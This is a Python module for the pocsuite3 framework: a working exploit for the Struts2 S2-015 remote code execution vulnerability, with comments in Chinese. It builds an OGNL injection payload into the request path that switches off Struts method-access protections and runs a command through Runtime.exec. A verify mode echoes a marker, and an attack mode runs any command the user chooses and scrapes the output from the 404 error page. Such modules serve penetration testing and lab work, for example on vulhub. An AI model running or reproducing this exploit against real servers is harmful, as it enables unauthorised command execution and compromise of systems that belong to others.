from collections import OrderedDict
import re
from urllib import parse
from requests.exceptions import ReadTimeout
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, OptString


class DemoPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1'
    appName = 'Struts2'
    appVersion = '2.0.0 - 2.3.14.2'
    name = 'Struts2-015远程代码执行'
    desc = '''Struts2-015远程代码执行'''
    pocDesc = '''Struts2-015远程代码执行'''
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    references = ['https://github.com/vulhub/vulhub/blob/master/struts2/s2-015/README.zh-cn.md']

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):
        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        result = {}
        cmd = "echo VuLnEcHoPoCSuCCeSS"
        # vulmap这个地方的payload是写死了的，执行的命令为id，执行的结果会在404页面显示出来
        payload = r"/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAcces" \
            r"s.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberA" \
            r"ccess, true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('RECOMMAND').getInp" \
            r"utStream())}.action"
        payload = payload.replace("RECOMMAND", cmd)
        url = self.url + payload
        flag = "VuLnEcHoPoCSuCCeSS"

        try:
            response = requests.get(url, headers=HEADERS)
            if response.status_code == 404 and flag in response.text: # 这个地方不能判断response对象存在
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        result = {}
        cmd = self.get_option("command")
        # vulmap这个地方的payload是写死了的，执行的命令为id，执行的结果会在404页面显示出来
        payload = r"/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAcces" \
                  r"s.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberA" \
                  r"ccess, true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('RECOMMAND').getInp" \
                  r"utStream())}.action"
        payload = payload.replace("RECOMMAND", cmd)
        url = self.url + payload

        try:
            response = requests.get(url, headers=HEADERS)
            if response.status_code == 404:  # 这个地方不能判断response对象存在
                res = parse.unquote(str(re.findall(r"<p><b>Message</b>(.*?)</p>", response.content.decode('utf-8'))))
                result['Stdout'] = res
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)


register_poc(DemoPOC)
